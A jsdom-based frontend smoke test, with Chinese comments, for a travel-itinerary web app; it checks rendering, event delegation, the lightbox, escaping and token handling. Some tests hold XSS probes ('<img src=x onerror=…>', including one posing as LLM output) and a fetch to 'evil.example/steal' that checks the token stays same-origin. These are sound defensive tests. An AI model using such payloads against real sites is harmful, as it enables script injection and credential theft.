/**
 * 前端运行时冒烟测试（jsdom 真跑脚本，不依赖真浏览器）。
 *
 * 为什么必须做运行时验证：
 * 2026-09-18 出过一次事故——`const esc = ...` 遮蔽了全局转义函数 `esc()`，
 * 导致详情卡在渲染中途抛错、内容大面积缺失；异常被 `.catch()` 吞掉，
 * 静态检查（语法/命名）全都通过。只有"真的执行一遍并断言 DOM 内容"才能抓住它。
 *
 * 用法：
 *   node tools/frontend_smoke.js                       # 测当前 static/index.html
 *   node tools/frontend_smoke.js /path/to/old.html     # 测指定版本（用于验证测试有效性）
 * 需要 jsdom：NODE_PATH 指向装有 jsdom 的 node_modules。
 */
const fs = require('fs');
const path = require('path');
const { JSDOM, VirtualConsole } = require('jsdom');

const REPO = path.resolve(__dirname, '..');
const HTML_PATH = process.argv[2] || path.join(REPO, 'static', 'index.html');
const SPOT = '测试景点·含' + "'" + '单引号&<标签>';   // 故意混入引号与标签，验证转义

const REVIEWS = {
  good: ['震撼: 一眼千年', '细节: 俑坑排列讲究'],
  bad: ['人海: 前排全是后脑勺', '暴晒: 全程无遮挡'],
  intro_long: '这是一段用于验证渲染的地点介绍文本，长度足够触发"地点介绍"区块的展示逻辑。',
};

function jsonRes(obj) {
  return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(obj) });
}

// 记录每次 fetch 的 url/init，供「访问令牌注入」断言用（令牌只能对同源请求生效）
const fetchLog = [];

function makeFetchStub() {
  return (url, init) => {
    fetchLog.push({ url: String(url), init });
    const u = String(url);
    if (u.includes('/demo/spots')) {
      return jsonRes({ city: '西安', spots: [{
        name: SPOT, lat: 34.26, lon: 108.94, stay_min: 60, score: 8,
        ticket: 30, desc: '测试描述', image: 'http://img/1.jpg', intro: '科教文化服务 · 评分4.8',
      }] });
    }
    if (u.includes('/demo/config')) {
      return jsonRes({ tile_url: '', subdomains: '', attribution: 'test', gcj: true });
    }
    if (u.includes('/favorites')) return jsonRes({ favorites: [] });
    if (u.includes('/plans')) return jsonRes({ plans: [] });
    if (u.includes('/poi/detail')) {
      return jsonRes({ photos: ['http://img/1.jpg', 'http://img/2.jpg'],
        intro: '科教文化服务 · 评分4.8', opentime: '09:00-17:00',
        address: '测试路 1 号', lat: 34.26, lon: 108.94, reviews: REVIEWS });
    }
    if (u.includes('/poi/reviews')) return jsonRes({ reviews: REVIEWS });
    if (u.includes('/plan/async')) return jsonRes({ task_id: 'smoke', ws_url: '/ws/smoke' });
    return jsonRes({});
  };
}

function fakePlan() {
  return {
    city: '西安', total_cost: 30, total_score: 8,
    hotel: { name: '测试酒店', lat: 34.261, lon: 108.942 },
    check_report: { passed: true, violations: [],
      stats: { spots_planned: 1, commute_api: { api_calls: 0 }, cache_hit_rate: 1 } },
    unplanned: [], reply: '', changes: [],
    days: [{ day: 1, commute_min: 12, cost: 30, active_min: 60,
      spots: [{ name: SPOT, arrive_h: 9, depart_h: 10, ticket: 30,
                desc: '测试描述', image: 'http://img/1.jpg', intro: '科教文化服务 · 评分4.8' }] }],
  };
}

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

(async () => {
  const html = fs.readFileSync(HTML_PATH, 'utf8');
  const errors = [];
  const vc = new VirtualConsole();
  // jsdom 的 CSS 解析器不认 oklch() / :where() 等现代语法，会把整张样式表报成
  // "Could not parse CSS stylesheet"。这是 jsdom 的局限，不是页面的问题
  // （真实浏览器渲染正常，:root 令牌已由截图脚本读 computedStyle 验证过）；
  // 而冒烟的断言查的是 DOM 结构与文本、不依赖 CSS —— 故过滤掉，免得噪音掩盖真问题。
  // canvas getContext 的 Not implemented 是 jsdom 固有限制：hero 夜空极光的 WebGL
  // 探测在 jsdom 下必然报这条，真浏览器不发生；降级路径由 hero_motion_check 真机断言
  const IGNORE = /Could not parse CSS stylesheet|Not implemented: HTMLCanvasElement's getContext/;
  const pushErr = s => { if (!IGNORE.test(s)) errors.push(s); };
  vc.on('jsdomError', e => pushErr('jsdomError: ' + (e.message || e)));
  vc.on('error', (...a) => pushErr('console.error: ' + a.join(' ')));

  // 关键：stub 必须在页面脚本执行之前注入（jsdom 在构造时就运行 <script>），
  // 因此用 beforeParse 钩子；事后赋 window.fetch 已太晚，页面首屏 fetch 会直接报错。
  class FakeWS {
    constructor() {
      const full = [
        { stage: '构造', msg: '冒烟：已完成' },
        // 2026-09-23 加：后端会把 LLM 原始输出写进「调试」阶段推给前端，
        // 所以进度日志的 stage/msg 必须当不可信输入处理。这里塞一个注入载荷验证转义。
        { stage: '调试', msg: '模型原始输出: <img id="xss-probe" src=x onerror="window.__pwned=1">' },
      ];
      // 后端 snapshot() 每帧都推**全量** progress[]：分两帧、第二帧重复同一份数组，
      // 前端必须只消费增量 —— 否则日志整段重放（一次规划 O(n²) 条重复日志）
      setTimeout(() => this.onmessage && this.onmessage({ data: JSON.stringify({
        status: 'running', progress: full }) }), 10);
      setTimeout(() => this.onmessage && this.onmessage({ data: JSON.stringify({
        status: 'completed', progress: full, result: fakePlan() }) }), 30);
    }
    close() {} send() {}
  }

  const dom = new JSDOM(html, {
    runScripts: 'dangerously', pretendToBeVisual: true,
    url: 'http://localhost:8000/', virtualConsole: vc,
    beforeParse(w) {
      w.fetch = makeFetchStub();
      w.WebSocket = FakeWS;
      w.alert = () => {};
      w.confirm = () => true;
    },
  });
  const { window } = dom;

  await sleep(50);                    // 等脚本初始化与首屏 fetch 完成

  const results = [];
  const check = (name, ok, detail = '') => {
    results.push({ name, ok, detail });
    console.log(`  ${ok ? '✓' : '✗'} ${name}${detail ? ' — ' + detail : ''}`);
  };

  // 1) 走真实流程：点「开始规划」→ 假 WebSocket 推送完成 → 内部 render() 被调用
  window.document.getElementById('go').click();
  await sleep(120);
  const viewText = window.document.getElementById('view').textContent;
  check('行程渲染：景点名出现在行程里', viewText.includes('测试景点'), '');
  check('行程渲染：住宿锚点行出现', viewText.includes('测试酒店'), '');

  // 2) 事件委托：点条目名应打开详情卡
  const entryName = window.document.querySelector('#view [data-act="detail"]');
  check('事件委托：行程条目带 data-act=detail', !!entryName);
  if (entryName) {
    entryName.dispatchEvent(new window.MouseEvent('click', { bubbles: true }));
    await sleep(5);
    check('事件委托：点击后打开详情卡', !!window.document.getElementById('spotModal'));
  }

  // 3) 详情卡内容完整性（本次事故的核心断言）
  await sleep(80);                    // 等 /poi/detail 与 /poi/reviews 的 promise 链
  const d = window.document;
  const photos = d.querySelectorAll('#spotPhotos img').length;
  check('详情卡：图片组渲染', photos >= 1, `img=${photos}`);
  check('详情卡：信息 chips 渲染', (d.getElementById('spotChips') || {}).textContent
        ?.includes('评分') === true);
  const introLen = (d.getElementById('spotIntroLong') || {}).textContent?.length || 0;
  check('详情卡：地点介绍有内容', introLen >= 10, `${introLen} 字`);
  const rvText = (d.getElementById('spotReviews') || {}).textContent || '';
  check('详情卡：真实评价渲染（好评）', rvText.includes('震撼'));
  check('详情卡：真实评价渲染（避雷）', rvText.includes('人海'));
  const rowText = (d.getElementById('spotRows') || {}).textContent || '';
  check('详情卡：营业时间/地址行渲染', rowText.includes('地址') && rowText.includes('测试路'),
        rowText.slice(0, 40));
  check('详情卡：导航为 data-act 而非内联 onclick',
        !!d.querySelector('#spotRows [data-act="nav"]'));

  // 3b) 灯箱：点缩略图放大，首帧与计数都要渲染。
  //     回归：lbUrls 曾从未被赋值（数据写进了没人读的 window.__spotPhotos），
  //     paint() 打开时也没调 —— 打开即空图、计数 "1 / 0"。
  const thumb = d.querySelector('#spotPhotos img');
  if (thumb) {
    thumb.dispatchEvent(new window.MouseEvent('click', { bubbles: true }));
    await sleep(5);
    const lb = d.getElementById('lightbox');
    check('灯箱：点击缩略图打开', !!lb);
    const lbSrc = lb?.querySelector('#lbImg')?.getAttribute('src');
    const lbCount = lb?.querySelector('#lbCount')?.textContent || '';
    check('灯箱：首帧已渲染且计数正确',
          lbSrc === 'http://img/1.jpg' && lbCount === '1 / 2',
          `src=${lbSrc} count=${lbCount}`);
    lb?.remove();
  } else {
    check('灯箱：点击缩略图打开', false, '无缩略图可点');
    check('灯箱：首帧已渲染且计数正确', false, '无缩略图可点');
  }

  // 4) 转义：带引号与尖括号的景点名不得被当作标签解析
  const nameEl = d.querySelector('#spotModal [data-act]') || d.querySelector('#spotModal b');
  const injected = d.querySelectorAll('#spotModal 标签').length;
  check('转义：外部名字中的尖括号未被解析为标签', injected === 0);

  // 4b) ASCII 标签载荷：HTML 解析器只把 <字母…> 当标签，上面的中文探针抓不住
  //     <img src=x onerror=…> 这类载荷 —— 标题曾漏 esc()，正是这类载荷可注入
  window.openSpotDetail('x"><img src=x onerror=1>');
  await sleep(5);
  check('转义：ASCII 标签载荷未在标题里成为元素',
        d.querySelectorAll('#spotModal img[src="x"]').length === 0);
  d.querySelectorAll('#spotModal').forEach(m => m.remove());

  // 5) 进度日志转义：后端推来的 stage/msg（含 LLM 原始输出）不得被解析成 DOM
  //    2026-09-23 修：log() 曾把 stage/msg 直接插进 innerHTML。
  const logEl = d.getElementById('log');
  check('转义：进度日志里的注入载荷未变成元素',
        d.querySelectorAll('#log #xss-probe').length === 0
        && d.querySelectorAll('#log img').length === 0);
  check('转义：进度日志把载荷当纯文本保留',
        (logEl?.textContent || '').includes('xss-probe'));

  // 5b) 全量 progress 不得重放：FakeWS 连推两帧同一份数组，去重后每条日志只出现一次
  const doneCount = ((logEl?.textContent || '').match(/冒烟：已完成/g) || []).length;
  check('进度日志：全量 progress 重放被去重', doneCount === 1, `出现 ${doneCount} 次`);

  // 6) 访问令牌注入：只在**同源**请求上加 X-App-Token，跨域绝不带（防泄露）。
  //    注入由 <head> 里的 window.fetch 包装层完成；这里用 stub 记录的 init 验证。
  const headerVal = (headers, name) => {
    if (!headers) return null;
    if (typeof headers.get === 'function') return headers.get(name);   // 原生 Headers
    if (Array.isArray(headers)) {
      const p = headers.find(p => String(p[0]).toLowerCase() === name.toLowerCase());
      return p ? p[1] : null;
    }
    const k = Object.keys(headers).find(k => k.toLowerCase() === name.toLowerCase());
    return k ? headers[k] : null;
  };

  check('令牌：页面有 #tokenBtn 入口', !!d.getElementById('tokenBtn'));

  // 未设置令牌：首屏所有同源请求都不该多带该头（行为与改造前一致）
  check('令牌：未设置时请求不带 X-App-Token',
    fetchLog.length > 0 && fetchLog.every(c => headerVal(c.init && c.init.headers, 'X-App-Token') === null),
    `calls=${fetchLog.length}`);

  // 设置令牌后：同源带、跨域不带
  window.setAppToken('T');
  await window.fetch('/demo/spots?city=西安');
  const sameCall = fetchLog[fetchLog.length - 1];
  check('令牌：同源请求带上 X-App-Token=T',
    headerVal(sameCall.init && sameCall.init.headers, 'X-App-Token') === 'T');

  await window.fetch('https://evil.example/steal');
  const crossCall = fetchLog[fetchLog.length - 1];
  check('令牌：跨域请求不带 X-App-Token（防泄露）',
    headerVal(crossCall.init && crossCall.init.headers, 'X-App-Token') === null);

  // N) 步骤切换时页头收起。
  //    ②③ 步页面主角是景点/行程，顶部那 235px 宣传语只剩干扰（真机实测占首屏 28%，
  //    收起后 240px → 62px）。但 #chips 必须留着：规划完成后它被替换成状态摘要
  //    （总门票/已排/校验），是那一屏最该被看见的信息 —— 所以只收 h1 与副标题。
  {
    const heroEl = () => window.document.querySelector('#pagePlan > header.hero');
    const compact = () => !!(heroEl() && heroEl().classList.contains('compact'));
    window.setStep(1, true);
    check('第①步：页头完整展开', !compact());
    window.setStep(2, true);
    check('第②步：页头收起（compact）', compact());
    window.setStep(3, true);            // 前面已跑完「开始规划」，plan 存在
    check('第③步：页头仍收起', compact());
    check('第③步：状态摘要 chips 还在（没被一起藏掉）',
      heroEl().querySelectorAll('.chip').length > 0,
      '实际 ' + heroEl().querySelectorAll('.chip').length + ' 个');
    window.setStep(1, true);
    check('退回第①步：页头恢复展开', !compact());

    // 逐条判断：不能对拼接后的整体做 test，否则「某条含 .chips」+
    // 「另一条含 display:none」会被误判成同一条（第一版就是这么写错的）
    const rules = html.match(/#pagePlan > header\.hero\.compact[^}]*}/g) || [];
    check('收起规则不隐藏 .chips（防手滑改坏）',
      !rules.some(r => /\.chips/.test(r) && /display\s*:\s*none/.test(r)));
  }

  if (errors.length) {
    console.log('\n运行时错误：');
    errors.slice(0, 5).forEach(e => console.log('   - ' + e.slice(0, 160)));
  }

  const failed = results.filter(r => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} 项通过` +
              (failed.length ? `，${failed.length} 项失败` : ''));
  dom.window.close();
  process.exit(failed.length ? 1 : 0);
})().catch(e => {
  console.error('冒烟测试异常:', e && e.stack || e);
  process.exit(2);
});
